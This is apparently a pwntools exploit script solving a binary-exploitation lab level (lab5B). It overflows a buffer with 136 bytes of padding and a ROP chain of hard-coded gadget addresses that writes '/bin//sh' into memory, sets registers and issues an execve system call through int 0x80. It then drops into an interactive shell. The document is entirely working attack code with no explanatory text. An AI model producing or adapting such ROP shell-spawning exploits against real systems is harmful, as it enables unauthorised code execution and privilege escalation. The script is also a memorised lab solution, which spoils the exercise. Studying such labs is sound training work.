from pwn import *
from struct import pack

r = process(["/tmp/transcen/r.sh", "/levels/lab05/lab5B"])

# Padding goes here
p = ''

p += pack('<I', 0x0806ec5a) # pop edx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += pack('<I', 0x080bbf26) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0809a95d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ec5a) # pop edx ; ret
p += pack('<I', 0x080eb064) # @ .data + 4
p += pack('<I', 0x080bbf26) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0809a95d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ec5a) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x080544e0) # xor eax, eax ; ret
p += pack('<I', 0x0809a95d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += pack('<I', 0x080e55ad) # pop ecx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x0806ec5a) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x080544e0) # xor eax, eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x0807b6b6) # inc eax ; ret
p += pack('<I', 0x08049401) # int 0x80

r.sendline("A" * 136 + "BBBB" + p)
r.interactive()

